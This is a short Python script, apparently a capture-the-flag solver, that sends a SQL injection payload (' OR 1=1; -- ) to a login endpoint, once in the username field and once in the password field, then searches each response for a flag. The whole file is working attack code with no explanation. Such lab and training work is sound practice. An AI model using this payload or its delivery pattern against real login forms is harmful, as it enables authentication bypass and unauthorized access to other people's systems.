import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

BASE_URL = "https://login.quoccacorp.com/v1"
PAYLOAD = "' OR 1=1; -- "

class Solver:
    def __init__(self):
        self.session = get_session()

    def run(self):
        # You can enter the payload in either the username field or the password field
        response1 = self.session.post(BASE_URL, data={"username": PAYLOAD})
        find_flag(response1.text)

        response2 = self.session.post(BASE_URL, data={"password": PAYLOAD})
        find_flag(response2.text)

if __name__ == "__main__":
    Solver().run()